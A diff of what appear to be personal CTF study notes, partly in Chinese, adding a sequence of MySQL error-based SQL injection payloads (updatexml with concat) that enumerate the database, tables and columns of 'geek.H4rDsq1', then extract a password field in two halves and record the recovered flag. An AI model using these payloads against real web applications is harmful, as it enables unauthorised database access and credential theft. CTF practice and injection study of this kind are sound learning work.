@@ -378,9 +378,20 @@ echo serialize($a);
 关于===php伪协议===：[[【精选】文件包含支持的伪协议_data伪协议-CSDN博客.pdf]]
 
 `1'or(updatexml(1,concat(0x7e,database()),1))#`
+
 `1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))),1))#`
-`1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))),1))#`
-1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(geek.H4rDsq1))),1))#
 
+`1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))),1))#
 
+1'or(updatexml(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))),1))#
+
+(select(left(password,30))from(geek.H4rDsq1))
+
+1'or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))),1))#
+
+(select(right(password,30))from(geek.H4rDsq1))
+
+flag{05c6eef2-494f-4b0b-8f6e-6
+2-494f-4b0b-8f6e-6a278c2fc7cf}
+flag{05c6eef2-494f-4b0b-8f6e-6a278c2fc7cf}
 
